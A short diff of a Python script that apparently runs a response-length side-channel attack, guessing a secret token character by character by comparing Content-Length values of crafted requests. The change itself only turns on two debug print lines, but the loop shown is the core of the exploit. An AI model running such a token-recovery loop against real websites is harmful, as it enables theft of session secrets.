@@ -22,10 +22,10 @@ while (check):
         build2 = TOKEN+MASK+iter+MASK
 
         req1 = int(requests.get(URL+build1).headers.get('Content-Length'))
-        #print("TRY "+build1+" Length Response = "+str(req1))
+        print("TRY "+build1+" Length Response = "+str(req1))
 
         req2 = int(requests.get(URL+build2).headers.get('Content-Length'))
-        #print("TRY "+build2+" Length Response = "+str(req2))
+        print("TRY "+build2+" Length Response = "+str(req2))
 
         if (int(req1) <= responB) and (int(req2) > int(req1)):
             temp = iter
